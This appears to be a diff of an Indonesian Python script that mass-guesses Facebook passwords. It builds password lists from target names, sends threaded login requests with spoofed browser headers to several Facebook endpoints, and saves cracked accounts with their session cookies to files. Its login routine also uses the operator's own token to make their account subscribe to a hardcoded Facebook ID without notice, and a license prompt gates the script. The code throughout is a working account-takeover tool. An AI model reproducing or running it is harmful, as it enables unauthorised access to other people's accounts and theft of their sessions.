@@ -13,15 +13,6 @@ from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
 from datetime import datetime
 from random import randint
 
-#module rich
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
-from rich.console import Console
-from rich.table import Table
-from rich.columns import Columns
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
-console = Console()
 # TANGGAL WAKTU
 ct = datetime.now()
 n = ct.month
@@ -54,10 +45,6 @@ P = '\x1b[1;97m'
 C = '\x1b[0m'    
 pepek = ['100010061977994','maushamsingh088']
 
-# HAPUS
-def hapus():
-        try:os.remove(".cokie.txt");os.remove(".token.txt")
-        except:pass
 
 # JALAN
 def jalan(keliling):
@@ -107,7 +94,7 @@ def login():
 		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
 		open('data/token.txt','w').write(tokenB)
 		open('data/cookie.txt','w').write(kukis)
-		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
+		print (f"\n{B} + token:{P} {tokenB}");jeda(2)
 		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		print (f"\n{H} √ login berhasil");jeda(2)
 		menu()
@@ -143,7 +130,7 @@ def menu():
 			os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
 			exit(f'{M} ! cookie invalid')
 	except (FileNotFoundError,KeyError,IOError):
-#		print (f"{M}cookie invalid");jeda(2)
+#		print (f"{M} cookie invalid");jeda(2)
 		login()
 	except requests.exceptions.ConnectionError:
 		exit(f"{M} ! tidak ada koneksi")
@@ -167,14 +154,8 @@ def menu():
 	elif romz in ['2']:
 		massal(token,coki)
 	elif romz in ['3']:
-		massal(token,coki)
-	elif romz in ['4']:
-		massal(token,coki)
-	elif romz in ['5']:
-		massal(token,coki)
-	elif romz in ['6']:
 		hasil()
-	elif romz in ['7']:
+	elif romz in ['4']:
 		UA()
 		uas = open('ugent.txt','r').read()
 		print (f"{P} ! User-Agent saat ini: {U}{uas}")
@@ -188,6 +169,7 @@ def menu():
 		else:
 			open('ugent.txt','w').write(us)
 	elif romz in ['0']:
+		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
 		exit()
 	else:
 		print ("\n ! isi yg benar")
@@ -196,7 +178,7 @@ def activate_licensi():
 	os.system("clear")
 	logo()
 	print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
-	key = input("🔥\x1b[1;97m LISENSI:\x1b[1;96m ").lower()
+	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
 	if "gets" in key:
 		os.system("xdg-open https://fbkey.ratuerror.com/register/")
 		activate_licensi()
@@ -393,13 +375,13 @@ class crack:
 				uid = akun.split('<=>')[0]
 				pwx = pwek.split(",")
 				if men in['1']:
-					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
 				elif men in['2']:
-					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
 				elif men in['3']:
-					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
-					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "m.alpha.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
@@ -434,44 +416,28 @@ class crack:
 						pwx.append(na+'12345')
 						pwx.append(na+'1234')
 				if men in['1']:
-					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
 				elif men in['2']:
-					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
 				elif men in['3']:
-					titid.submit(self.__crack1__, uid, pwx,  "m.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
-					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "graph.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
 		self.hasil(ok,cp)
 	
 	#--- methode
-	def __crack__(self, user, peweh, url_log):
+	def __romz__(self, user, peweh, url_log):
 		global ok,cp,loop 
 		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		print (f"\r- {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
 		for pw in peweh:
 			try: 
-				ua = self.UA()
-				ua2 = self.user_agentAPI()
 				ses = requests.Session()
-				headers1 = {
-					"host":url_log,
-					"connection": "keep-alive",
-					"cache-control": "max-age=0",
-					"upgrade-insecure-requests":"1",
-					"user-agent":ua,
-					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-					"x-requested-with":"XMLHttpRequest",
-					"sec-fetch-site":"same-origin",
-					"sec-fetch-mode":"navigate",
-					"sec-fetch-user":"?1",
-					"sec-fetch-dest":"document",
-					"referer":f"https://{url_log}/",
-					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-				}
-				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers1).text 
+				headex={"Host":url_log,"upgrade-insecure-requests":"1","user-agent":self.user_agentAPI(),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":f"https://{url_log}/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				ling = ses.get(f'https://{url_log}/',headers=headex).text 
 				times = int(datetime.now().timestamp())
 				dataa ={
 					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
@@ -481,51 +447,55 @@ class crack:
 					'try_number': '0',
 					'unrecognized_tries': '0',
 					'email':user,
+					#'pass':pw,
 					'encpass': '#PWD_BROWSER:0:{}:{}'.format(times, pw),
 					'prefill_contact_point':user,
 					'prefill_source': 'browser_dropdown', 
-					'prefill_type': 'password', 
+					'prefill_type': 'contact_point', 
 					'first_prefill_source': 'browser_dropdown', 
 					'first_prefill_type': 'contact_point', 
-					'had_cp_prefilled':'true',
-					'had_password_prefilled':'true',
-					'is_smart_lock':'false',
+					'had_cp_prefilled':'true', 
+					'had_password_prefilled':'true', 
+					'is_smart_lock':'false', 
 					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
 					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1),
+					'm_sess': '',
 					'__dyn': '',
 					'__csr': '',
-					'__req': random.choice(['1','2','3','4','5']),
-					'__a': re.search('"encrypted":"(.*?)"', str(ling)).group(1),
+					'__req': random.choice(['1','2','3','4','5']), # 'd',
+					'__a': '',
 					'__user': '0'
 					}
-				headers2 ={ 
-					'host': url_log,
+				ses.headers.update({ 
+					'Host': url_log,
 					'content-length': f"{len(str(dataa))}",
 					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
-					'user-agent': ua2,
+					'user-agent': self.user_agentAPI(),
 					'content-type': 'application/x-www-form-urlencoded',
 					'accept': '*/*', 
 					'origin': 'https://'+url_log,
 					'sec-fetch-site': 'same-origin',
 					'sec-fetch-mode': 'cors',
 					'sec-fetch-dest': 'empty', 
-					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+					'referer': f'https://{url_log}/',
 					'accept-encoding': 'gzip, deflate, br',
-					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-					#'cookie': (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
-					#}
-				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=headers2, allow_redirects=False)
+					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+					'cookie': (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
+				})
+				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, allow_redirects=False)
 				if 'c_user' in ses.cookies.get_dict().keys():
 					romz = ses.cookies.get_dict()
 					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
-					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.user_agentAPI()} \n ')
+					rr = "{user} ◊ {pw} ◊ {kukis}"
+					ok.append(f"{rr}")
+					open(f'OK/{waktu}.txt', 'a').write(f" *--> {rr}\n")
 					break
 				elif 'checkpoint' in ses.cookies.get_dict().keys():
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
-					cp.append(f'{user} ◊ {pw}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.user_agentAPI()} \n ')
+					rr = '{user} ◊ {pw}'
+					cp.append(f'{rr}')
+					open(f'CP/{waktu}.txt', 'a').write(f" *--> {rr}\n")
 					break
 				else:
 					continue
@@ -533,68 +503,6 @@ class crack:
 				time.sleep(3)
 			
 		loop+=1
-	
-	#--- methode
-	def __crack1__(self, user, peweh, url_log):
-		global loop,ok,cp
-		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print(f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
-		for pw in peweh:
-			try: 
-				ua = self.UA()
-				ses = requests.Session()
-				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text 
-				#times = int(datetime.now().timestamp())
-				dataa ={
-					'lsd':re.search('name="lsd" value="(.*?)"', str(ling.text)).group(1),
-					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling.text)).group(1),
-					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling.text)).group(1),
-					'li': re.search('name="li" value="(.*?)"',str(ling.text)).group(1),
-					'email':user,
-					'pass': pw,
-					}
-				headers2 ={ 
-					'host': url_log,
-					'content-length': '181',
-					'user-agent': 'Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36',
-					'content-type': 'application/x-www-form-urlencoded',
-					'accept': '*/*', 
-					'origin': 'https://'+url_log,
-					'sec-fetch-site': 'same-origin',
-					'sec-fetch-mode': 'cors',
-					'sec-fetch-dest': 'empty', 
-					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-					'accept-encoding': 'gzip, deflate, br',
-					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-					}
-				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=headers2, allow_redirects=False)
-				if 'c_user' in ses.cookies.get_dict().keys():
-					romz = ses.cookies.get_dict()
-					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
-					#print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
-					tree = Tree("",guide_style="b green")
-					tree.add(f"[b green]{user}[/] ◊ [b green]{pw}[/]")
-					tree.add(f"[b green]{kukis}[/]")
-					tree.add(f"[b green]{ua}[/]")
-					prints(tree)
-					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
-					break
-				elif 'checkpoint' in ses.cookies.get_dict().keys():
-					#print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
-					tree = Tree("",guide_style="b yellow")
-					tree.add(f"[b yellow]{user}[/] ◊ [b yellow]{pw}[/]")
-					tree.add(f"[b green]{ua}[/]")
-					prints(tree)
-					cp.append(f'{user} ◊ {pw}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
-					break
-				else:
-					continue
-			except requests.exceptions.ConnectionError:
-				time.sleep(3)
-		loop+=1
-
 
 	# FINISH
 	def hasil(self,ok,cp):
@@ -653,5 +561,9 @@ if __name__=="__main__":
 	#os.system("clear")
 	#os.system("git pull")
 	try:os.mkdir('data')
+	except:pass 
+	try:os.mkdir('CP')
+	except:pass 
+	try:os.mkdir('OK')
 	except:pass 
 	menu()
